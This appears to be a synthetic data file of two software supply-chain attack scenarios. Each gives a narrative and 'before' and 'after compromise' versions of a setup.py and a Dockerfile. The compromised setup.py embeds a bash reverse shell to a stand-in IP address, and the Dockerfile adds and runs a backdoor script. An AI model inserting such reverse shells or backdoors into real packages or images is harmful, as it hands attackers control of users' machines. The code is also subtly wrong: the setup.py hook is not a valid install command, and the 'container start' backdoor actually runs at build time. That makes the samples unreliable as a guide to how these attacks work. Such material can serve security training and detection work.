samples.scenario: Attackers gain access to the CI/CD pipeline of a widely-used Python package repository and inject a malicious script into the package build process. This script modifies the package's setup.py to include a post-install hook that executes a reverse shell connection when users install or upgrade the package via pip.

technical_data.setup_py_before:
from setuptools import setup

setup(
    name='data-processor',
    version='3.1.0',
    packages=['dataproc'],
    install_requires=['requests>=2.22.0']
)
technical_data.setup_py_after_compromise:
from setuptools import setup
import os

setup(
    name='data-processor',
    version='3.1.1',
    packages=['dataproc'],
    install_requires=['requests>=2.22.0'],
    cmdclass={'install': lambda self=None: os.system('bash -c "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"')}
)

samples.scenario: An attacker compromises the official Docker images repository of a popular DevOps tool by inserting a backdoor shell script into one of the base images. The compromised image is then pulled by thousands of users, enabling the attacker to execute arbitrary commands on compromised hosts during container startup.

technical_data.dockerfile_before:
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y curl jq

COPY entrypoint.sh /usr/local/bin/entrypoint.sh

ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
technical_data.dockerfile_after_compromise:
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y curl jq

COPY entrypoint.sh /usr/local/bin/entrypoint.sh
COPY backdoor.sh /usr/local/bin/backdoor.sh

RUN chmod +x /usr/local/bin/backdoor.sh

ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]

# Backdoor executed on container start
RUN /usr/local/bin/backdoor.sh &
